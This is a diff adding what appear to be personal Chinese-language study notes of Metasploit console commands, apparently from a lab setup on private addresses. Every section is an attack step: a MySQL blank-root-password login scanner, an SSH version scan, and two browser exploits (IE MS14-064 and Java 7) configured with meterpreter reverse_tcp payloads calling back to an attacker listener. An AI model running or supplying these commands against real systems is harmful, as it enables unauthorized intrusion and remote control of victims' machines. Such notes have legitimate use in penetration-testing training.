@@ -1,0 +1,44 @@
+
+	https://blog.csdn.net/qq_21310689/article/details/85594699
+
+jobs -K 停止所有
+
+search name:mysql type:exploit
+search platform:mysql   ‍‍缩小查询范围‍‍
+
+mysql扫描空密码
+search mysql_login
+use auxiliary/scanner/mysql/mysql_login 
+show options 
+set USERnAME root
+set BlANK_PASSWORDS true
+set rhosts 192.168.100.140
+run
+
+ssh信息收集
+search ssh_version
+use auxiliary/scanner/ssh/ssh_version
+options
+set rhosts 192.168.100.140
+run
+
+利用win7系统的IE浏览器漏洞获取shell
+use exploit/windows/browser/ms14_064_ole_code_execution
+set payload windows/meterpreter/reverse_tcp 
+set lhost 192.168.100.143
+set LPORT 4444
+options
+set target 1
+run
+
+使用java7模块getshell
+use exploit/multi/browser/java_jre17_driver_manager
+set payload java/meterpreter/reverse_tcp 
+set lhost 192.168.100.143
+set LPORT 4444
+run
+
+
+
+
+
